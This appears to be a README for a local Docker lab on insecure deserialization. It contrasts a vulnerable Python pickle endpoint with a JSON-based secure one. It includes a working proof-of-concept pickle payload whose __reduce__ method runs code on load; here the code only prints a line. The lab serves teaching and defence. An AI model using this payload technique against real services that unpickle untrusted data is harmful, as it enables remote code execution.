# Insecure Deserialization - Runnable Lab

```bash
cd examples/web/deserialization && docker compose up --build
# vulnerable: http://localhost:8013   secure: http://localhost:8014
```

```bash
# Vulnerable: craft a pickle whose __reduce__ runs on load, then watch the
# container logs print a line server-side purely from loading the payload
PAYLOAD=$(python3 -c "
import pickle, base64
class Evil:
    def __reduce__(self):
        return (print, ('!! arbitrary code executed during unpickling !!',))
print(base64.b64encode(pickle.dumps(Evil())).decode())
")
curl -X POST http://localhost:8013/load -d "$PAYLOAD"
docker compose logs vulnerable | tail -5

# Secure: JSON in, JSON out - no way to smuggle executable behavior
curl -X POST http://localhost:8014/load -H "Content-Type: application/json" -d '{"name": "alice"}'
```
